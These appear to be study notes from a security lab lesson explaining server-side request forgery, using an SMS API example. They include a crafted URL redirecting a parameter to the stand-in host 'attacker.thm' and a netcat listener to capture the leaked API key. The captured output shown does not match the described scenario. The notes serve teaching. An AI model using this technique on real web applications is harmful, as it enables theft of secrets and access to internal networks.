### Server-Side Request Forgery

<mark style="background: #BBFABBA6;">This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself</mark>. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.

Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require us to add a secret key, which they pre-assign to us, to each request we make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:

By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the `server` parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the `server` to point to a machine they control, and our web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at our expense. To achieve this, the attacker would only need to make the following request to our website:

`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

This would make the vulnerable web application make a request to:

`https://attacker.thm/api/send?msg=ABC` 

We could then just capture the contents of the request using Netcat:

AttackBox:

```shell-session
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11

```

This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:  

- Enumerate internal networks, including IP addresses and ports.
- Abuse trust relationships between servers and gain access to otherwise restricted services.
- Interact with some non-HTTP services to get remote code execution (RCE).
